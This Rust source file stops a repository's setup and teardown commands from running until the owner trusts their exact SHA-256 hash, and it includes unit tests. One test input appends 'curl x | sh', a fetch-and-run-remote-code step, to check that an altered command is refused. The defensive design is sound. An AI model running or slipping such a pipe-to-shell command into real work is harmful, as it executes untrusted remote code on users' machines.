//! Trust for a repository's setup and teardown commands (`.gudo.json`): a clone or an unpacked
//! archive must not run commands as the user just because a task was started in it.
//!
//! The owner trusts a repository's exact commands (SHA-256 of both) from the app; they run
//! from then on until they change. Kept in `<state>/repo-trust.json`:
//! `{ "<main worktree>": ["<hash>", …] }`.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::sync::Mutex;

use proto::RepoHooks;

use crate::core::lock;
use crate::fsutil;

const FILE: &str = "repo-trust.json";
/// Hashes kept per repository (branches may differ), newest last.
const MAX_PER_REPO: usize = 16;

/// SHA-256 of the commands that would run, hex. Each part is tagged and length-prefixed so
/// no two different pairs hash alike.
pub(crate) fn hash(hooks: &RepoHooks) -> String {
    let mut hasher = ring::digest::Context::new(&ring::digest::SHA256);
    for part in [&hooks.setup, &hooks.teardown] {
        match part {
            Some(command) => {
                hasher.update(&[1]);
                hasher.update(&(command.len() as u64).to_le_bytes());
                hasher.update(command.as_bytes());
            }
            None => hasher.update(&[0]),
        }
    }
    fsutil::hex(hasher.finish().as_ref())
}

pub(crate) struct HookTrust {
    file: PathBuf,
    repos: Mutex<BTreeMap<String, Vec<String>>>,
}

impl HookTrust {
    pub fn load(state_dir: &Path) -> Self {
        let file = state_dir.join(FILE);
        let repos = fsutil::read_optional(&file)
            .ok()
            .flatten()
            .and_then(|bytes| serde_json::from_slice(&bytes).ok())
            .unwrap_or_default();
        Self {
            file,
            repos: Mutex::new(repos),
        }
    }

    /// Whether `hooks` may run in `repo` (its main worktree): nothing to run, or exactly these
    /// commands were trusted there.
    pub fn trusted(&self, repo: &Path, hooks: &RepoHooks) -> bool {
        if hooks.setup.is_none() && hooks.teardown.is_none() {
            return true;
        }
        let hash = hash(hooks);
        lock(&self.repos)
            .get(&key(repo))
            .is_some_and(|hashes| hashes.contains(&hash))
    }

    /// `hooks` with what is not trusted in `repo` left out, logging what was held back.
    pub fn runnable(&self, repo: &Path, hooks: RepoHooks) -> RepoHooks {
        if self.trusted(repo, &hooks) {
            return hooks;
        }
        tracing::info!(repo = %repo.display(), "repository commands not trusted; not running them");
        RepoHooks::default()
    }

    pub fn trust(&self, repo: &Path, hash: &str) {
        let mut repos = lock(&self.repos);
        let hashes = repos.entry(key(repo)).or_default();
        hashes.retain(|trusted| trusted != hash);
        hashes.push(hash.to_owned());
        if hashes.len() > MAX_PER_REPO {
            hashes.remove(0);
        }
        match serde_json::to_vec_pretty(&*repos) {
            Ok(data) => {
                if let Err(error) = fsutil::write_atomic(&self.file, &data) {
                    tracing::warn!("saving repository trust: {error}");
                }
            }
            Err(error) => tracing::warn!("encoding repository trust: {error}"),
        }
    }
}

fn key(repo: &Path) -> String {
    repo.canonicalize()
        .unwrap_or_else(|_| repo.to_owned())
        .to_string_lossy()
        .into_owned()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn hooks(setup: Option<&str>, teardown: Option<&str>) -> RepoHooks {
        RepoHooks {
            setup: setup.map(Into::into),
            teardown: teardown.map(Into::into),
        }
    }

    #[test]
    fn only_the_trusted_commands_of_that_repository_run() {
        let state = tempfile::tempdir().unwrap();
        let repo = tempfile::tempdir().unwrap();
        let other = tempfile::tempdir().unwrap();
        let trust = HookTrust::load(state.path());
        let setup = hooks(Some("make deps"), None);

        assert!(trust.trusted(repo.path(), &RepoHooks::default()));
        assert!(!trust.trusted(repo.path(), &setup));
        assert_eq!(
            trust.runnable(repo.path(), setup.clone()),
            RepoHooks::default()
        );

        trust.trust(repo.path(), &hash(&setup));
        assert!(trust.trusted(repo.path(), &setup));
        assert!(!trust.trusted(other.path(), &setup), "per repository");
        // A changed command, or one moved from setup to teardown, is asked about again.
        assert!(!trust.trusted(repo.path(), &hooks(Some("make deps; curl x | sh"), None)));
        assert!(!trust.trusted(repo.path(), &hooks(None, Some("make deps"))));
        assert!(!trust.trusted(repo.path(), &hooks(Some("make deps"), Some(""))));

        assert!(HookTrust::load(state.path()).trusted(repo.path(), &setup));
    }
}
